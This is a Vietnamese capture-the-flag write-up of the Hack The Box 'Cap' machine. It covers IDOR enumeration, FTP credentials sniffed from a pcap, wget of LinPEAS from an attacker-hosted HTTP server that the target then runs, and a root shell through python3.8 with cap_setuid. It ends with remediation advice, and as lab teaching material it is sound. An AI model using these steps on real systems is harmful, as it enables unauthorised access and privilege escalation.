# Hack The Box — CAP

> Write-up này được thực hiện trong môi trường lab có kiểm soát. Chỉ áp dụng các kỹ thuật bên dưới trên hệ thống mà bạn được phép kiểm thử.

## 1. Quét dịch vụ

Tiến hành quét các cổng đang mở trên host mục tiêu:

```bash
nmap -sS -sC -sV 10.129.13.241
```

Kết quả cho thấy ba dịch vụ đáng chú ý:

| Port | Dịch vụ | Phiên bản |
| --- | --- | --- |
| `21/tcp` | FTP | vsftpd 3.0.3 |
| `22/tcp` | SSH | OpenSSH 8.2p1 Ubuntu |
| `80/tcp` | HTTP | Gunicorn |

![Kết quả quét Nmap](public/images/cap/cap-01.png)

## 2. Khai thác IDOR để tải file PCAP

Ứng dụng web cung cấp chức năng **Security Snapshot**. Sau khi tạo snapshot, trình duyệt chuyển đến URL có dạng:

```text
/data/1
```

![Trang Security Snapshot tại đường dẫn data 1](public/images/cap/cap-02.png)

Giá trị sau `/data/` là ID của snapshot. Ứng dụng không kiểm tra quyền sở hữu đối tượng trước khi trả dữ liệu, vì vậy có thể thử các ID khác để truy cập snapshot của người dùng khác.

Sử dụng Burp Suite Intruder với payload số từ `0` đến `10`:

![Thiết lập payload trong Burp Suite Intruder](public/images/cap/cap-03.png)

Kết quả cho thấy các ID từ `0` đến `3` trả về phản hồi hợp lệ, trong khi các ID lớn hơn chuyển hướng:

![Kết quả dò ID snapshot](public/images/cap/cap-04.png)

Thử truy cập `/data/0` và tải file `0.pcap`:

![Snapshot tại đường dẫn data 0](public/images/cap/cap-05.png)

## 3. Phân tích PCAP và thu thập thông tin đăng nhập

Mở `0.pcap` bằng Wireshark. Có thể thấy lưu lượng FTP truyền thông tin nhạy cảm dưới dạng plaintext:

![Thông tin đăng nhập FTP xuất hiện trong Wireshark](public/images/cap/cap-06.png)

Theo dõi TCP stream để xem toàn bộ phiên FTP:

![TCP stream chứa thông tin đăng nhập FTP](public/images/cap/cap-07.png)

Thông tin đăng nhập thu được:

```text
Username: nathan
Password: Buck3tH4TF0RM3!
```

Sử dụng tài khoản này để đăng nhập SSH:

```bash
ssh nathan@10.129.13.241
```

Sau khi đăng nhập, có thể đọc `user.txt`:

![Đăng nhập SSH và đọc user flag](public/images/cap/cap-08.png)

## 4. Liệt kê khả năng leo thang đặc quyền

Mục tiêu tiếp theo là tìm binary có capability đặc biệt có thể bị lạm dụng để lấy quyền root:

![Yêu cầu tìm binary có capability đặc biệt](public/images/cap/cap-09.png)

Sử dụng [LinPEAS](https://github.com/peass-ng/PEASS-ng) để kiểm tra các khả năng leo thang đặc quyền. Máy mục tiêu không thể kết nối ra Internet nên tải `linpeas.sh` trên máy local trước:

![Máy mục tiêu không thể kết nối ra Internet](public/images/cap/cap-10.png)

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
```

![Tải LinPEAS trên máy local](public/images/cap/cap-11.png)

Kiểm tra địa chỉ IP của interface VPN trên máy local:

```bash
ifconfig
```

![Địa chỉ IP của interface tun0](public/images/cap/cap-12.png)

Khởi tạo HTTP server tại thư mục chứa `linpeas.sh`:

```bash
python3 -m http.server 8000
```

![Khởi tạo HTTP server ở port 8000](public/images/cap/cap-13.png)

Từ máy mục tiêu, tải và chạy LinPEAS:

```bash
wget http://10.10.14.69:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![Tải và chạy LinPEAS trên máy mục tiêu](public/images/cap/cap-14.png)

LinPEAS trả về nhiều phát hiện khác nhau:

![LinPEAS phát hiện PwnKit](public/images/cap/cap-15.png)

![LinPEAS phát hiện vấn đề liên quan PackageKit](public/images/cap/cap-16.png)

Phát hiện quan trọng là `/usr/bin/python3.8` có capability `cap_setuid`:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

![Python 3.8 có capability cap_setuid](public/images/cap/cap-17.png)

## 5. Leo thang lên root

Capability `cap_setuid` cho phép tiến trình thay đổi UID. Khởi chạy Python 3.8, đặt UID thành `0`, sau đó mở shell:

```bash
/usr/bin/python3.8
```

```python
import os

os.setuid(0)
os.system("/bin/bash")
```

Kiểm tra bằng `id` hoặc `whoami`, sau đó đọc `root.txt`:

![Leo thang đặc quyền thành công và đọc root flag](public/images/cap/cap-18.png)

## 6. Tổng kết

### IDOR — Broken Access Control

IDOR xảy ra khi ứng dụng cho phép truy cập trực tiếp một đối tượng thông qua ID hoặc tham số nhưng không kiểm tra quyền của người dùng hiện tại. Trong trường hợp này, thay đổi ID tại `/data/{id}` cho phép tải snapshot không thuộc tài khoản đang đăng nhập.

**Khuyến nghị:**

- Kiểm tra quyền sở hữu hoặc quyền truy cập trên từng đối tượng ở phía server.
- Không dựa vào việc ID khó đoán để bảo vệ tài nguyên.
- Áp dụng nguyên tắc đặc quyền tối thiểu cho người dùng và dịch vụ.

### Insecure Communication — CWE-319

FTP truyền username và password dưới dạng plaintext, vì vậy người có quyền đọc lưu lượng mạng có thể thu thập thông tin đăng nhập.

**Khuyến nghị:**

- Thay FTP bằng SFTP hoặc FTPS.
- Mã hóa dữ liệu nhạy cảm khi truyền qua mạng.
- Không tái sử dụng thông tin đăng nhập giữa các dịch vụ.

### Linux Capabilities

Gán `cap_setuid` cho trình thông dịch đa năng như Python tạo ra đường dẫn trực tiếp để leo thang đặc quyền.

**Khuyến nghị:**

- Xóa capability không cần thiết khỏi binary:

  ```bash
  sudo setcap -r /usr/bin/python3.8
  ```

- Thường xuyên kiểm tra capability bằng:

  ```bash
  getcap -r / 2>/dev/null
  ```

- Chỉ cấp capability tối thiểu cho binary chuyên dụng cần sử dụng nó.
